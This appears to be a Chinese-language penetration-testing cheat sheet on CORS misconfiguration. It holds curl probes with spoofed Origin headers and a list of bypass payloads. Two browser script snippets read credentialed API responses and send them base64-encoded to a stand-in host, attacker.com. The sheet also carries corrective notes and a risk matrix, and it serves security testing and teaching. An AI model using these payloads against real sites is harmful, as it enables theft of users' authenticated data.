# 🌍 CORS 配置错误速查表

<!-- language-home-navigation -->
[🏠 中文首页](../../README.zh-CN.md) • [🌐 Languages](../../README.md#-available-languages)

[🇮🇹 Versione Italiana](README.it.md) • [🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
   ██████╗ ██████╗ ██████╗ ███████╗
  ██╔════╝██╔═══██╗██╔══██╗██╔════╝
  ██║     ██║   ██║██████╔╝███████╗
  ██║     ██║   ██║██╔══██╗╚════██║
  ╚██████╗╚██████╔╝██║  ██║███████║
   ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝
   跨源资源共享
```

---

<a id="-what-is-cors"></a>
## 🎯 CORS 是什么

**CORS** 控制哪些源（Origin）可以通过浏览器读取跨源资源。配置错误可能使攻击者跨源窃取敏感数据。

---

<a id="-testing-cors"></a>
## 🔍 测试 CORS

### 基础测试
```bash
curl -H "Origin: https://evil.com" -I https://target.com/api/user

# 检查响应头：
Access-Control-Allow-Origin: https://evil.com  # 存在漏洞！（原文判断，参见下方说明）
Access-Control-Allow-Credentials: true         # 风险更高！（需结合凭据与数据判断）
```

> **验证说明：** CORS 是浏览器执行的响应共享机制，curl 不会替浏览器执行 CORS 检查；`-I` 发送的也是 HEAD 请求。单凭反射响应头不能确定影响，应结合实际浏览器中的可读响应、认证状态和敏感数据判断。[机制说明](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CORS)

### 测试载荷（Origin 请求头）
```
# 尝试绕过精确匹配检查
https://evil.com
https://target.com.evil.com
https://eviltarget.com
https://target.com%60.evil.com

# null 源
null

# 子域名
https://sub.target.com

# 协议降级
http://target.com
```

---

<a id="-exploitation"></a>
## 💉 漏洞利用

### 窃取数据（携带凭据）
```html
<script>
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://vulnerable.com/api/user', true);
xhr.withCredentials = true;
xhr.onload = function() {
    // 将数据发送给攻击者
    fetch('https://attacker.com/log?data=' + btoa(xhr.responseText));
};
xhr.send();
</script>
```

> **凭据说明：** `withCredentials` 和 `credentials: 'include'` 不能绕过 Cookie 的 SameSite 或浏览器第三方 Cookie 策略；只有满足相关凭据策略及 CORS 响应检查时，脚本才能读取认证响应。[MDN 说明](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CORS#requests_with_credentials)

### Fetch API 版本
```html
<script>
fetch('https://vulnerable.com/api/sensitive', {
    credentials: 'include'
})
.then(r => r.text())
.then(d => {
    fetch('https://attacker.com/?data=' + btoa(d));
});
</script>
```

> **示例编码说明：** 上方代码保留原文写法。[`btoa()`](https://developer.mozilla.org/en-US/docs/Web/API/Window/btoa)不直接支持任意 Unicode 文本，响应含中文等超出单字节范围的字符时可能抛出异常。

---

<a id="-vulnerability-matrix"></a>
## 📊 漏洞风险矩阵

> **矩阵勘误：** ACAO 指 `Access-Control-Allow-Origin`，ACAC 指 `Access-Control-Allow-Credentials`。原表省略了请求的凭据模式（credentials mode）：[Fetch 标准](https://fetch.spec.whatwg.org/#cors-protocol-and-credentials)规定，模式为 `include` 时 ACAO 不能是 `*`，即使实际没有 Cookie 也一样；模式不是 `include` 时，`*` 与 ACAC `true` 仍可共享响应，ACAC 会被忽略。ACAC 唯一有效的允许值是区分大小写的 `true`，不是 `false`。原表风险等级还须结合数据敏感性和攻击前提评估。

| ACAO 响应头 | ACAC | 风险 |
|-------------|------|------|
| `*` | false | 低（不携带凭据） |
| `*` | true | 无效配置 |
| 攻击者的源 | true | **严重** |
| null | true | **高** |
| 反射请求中的源 | true | **严重** |

### 危险的配置模式
```http
# 反射任意源
Access-Control-Allow-Origin: [request origin]
Access-Control-Allow-Credentials: true

# 允许 null 源
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

---

<a id="-quick-checks"></a>
## 🛠️ 快速检查

```bash
# 使用 curl 自动检查
for origin in "https://evil.com" "null" "https://target.com.evil.com"; do
  echo "Testing: $origin"
  curl -sI -H "Origin: $origin" https://target.com/api | grep -i "access-control"
done
```

---

<a id="-resources"></a>
## 📚 参考资源

- [PortSwigger CORS](https://portswigger.net/web-security/cors)
- [CORS 利用速查表](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration)

---

<p align="center">
  <b>🌍 利用 CORS 配置漏洞！</b><br>
  <i>仅限经授权的测试！</i>
</p>
